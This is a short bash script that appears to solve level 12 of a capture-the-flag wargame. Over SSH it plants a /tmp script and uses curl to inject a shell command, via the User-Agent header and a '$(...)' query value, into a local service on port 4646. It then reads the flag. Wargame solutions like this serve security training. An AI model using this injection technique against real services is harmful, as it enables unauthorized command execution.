#!/usr/bin/env bash

set -euo pipefail

PARENT_DIR="$(dirname "$0")"
UTILS_DIR="$PARENT_DIR/../utils"

PATH="$UTILS_DIR:$PATH"

host="$1"
port="$2"
pass="$3"

sshexec.sh "$host" "$port" level12 "$pass" 'set -e; echo "getflag > /tmp/flag12" > /tmp/level12; chmod a+rx /tmp/level12; curl -sA /tmp/level12 :::4646?x=\$\(\$HTTP_USER_AGENT\) > /dev/null; cat /tmp/flag12'
